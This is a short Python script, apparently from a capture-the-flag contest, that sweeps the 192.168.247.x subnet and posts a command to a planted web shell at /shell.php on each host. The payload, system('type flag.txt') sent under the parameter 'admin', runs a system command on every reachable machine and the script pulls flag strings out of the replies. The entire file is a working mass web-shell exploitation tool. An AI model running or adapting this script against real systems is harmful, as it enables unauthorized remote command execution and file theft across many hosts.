import urllib.request
import urllib.parse
import re
def post(url,data):
		datas = urllib.parse.urlencode(data).encode("utf-8")
		html = urllib.request.urlopen(url, datas).read()
		return html
url = 'http://192.168.247.{}'
shell_url = url+'/shell.php'
cmd = {'admin':"system('type flag.txt');"}
for i in range(1,255):
	try:
		html = post(shell_url.format(str(i)),data=cmd)
		flag = html.decode('utf-8')
		print(url.format(str(i)),re.findall("flag{.*?}", flag))
	except:
		pass